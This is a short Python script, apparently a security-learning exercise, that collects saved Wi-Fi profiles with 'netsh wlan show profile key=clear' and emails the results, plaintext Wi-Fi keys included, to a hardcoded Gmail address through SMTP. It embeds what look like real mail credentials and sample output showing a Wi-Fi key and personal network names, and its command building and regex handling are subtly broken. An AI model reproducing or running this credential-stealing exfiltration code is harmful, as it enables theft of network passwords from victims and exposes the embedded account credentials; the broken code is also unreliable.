#!/usr/bin/env python
import subprocess,smtplib,re


def send_email(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

#command = "netsh wlan show profile key=clear"
command = "ls -la"
#subprocess.Popen(command,shell=True) # runs the command
result = subprocess.check_output(command,shell=True) # runs the command and returns the output


#send_email("cyberheresec@gmail.com","btapydlbtadqldyg",result)

result_string = '''

Profile BULENT on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : BULENT
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "BULENT"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : 030820kbb

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default


'''

result_string_two = '''

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
    All User Profile     : Gloria
    All User Profile     : OPPO A54
    All User Profile     : BULENT
    All User Profile     : Galaxy A52 hüseyin
    All User Profile     : eduroam
    All User Profile     : KTU-Portal
    All User Profile     : Ozlu Apart-501
    All User Profile     : SUPERONLINE_WiFi_1EA7
    All User Profile     : Akgun
    All User Profile     : Balans
    All User Profile     : CENG-PCLAB

'''
network_names = re.findall("(Profile\s*:\s)(.*)",result_string_two)
result = ""
for networks in network_names:
    #print(network_names.group(2))
    #print(networks)
    command = "netsh wlan show profile" + networks + " key=clear"
    current_result = subprocess.check_output(command,shell=True)
    result = result + current_result
send_email("cyberheresec@gmail.com","btapydlbtadqldyg",result)
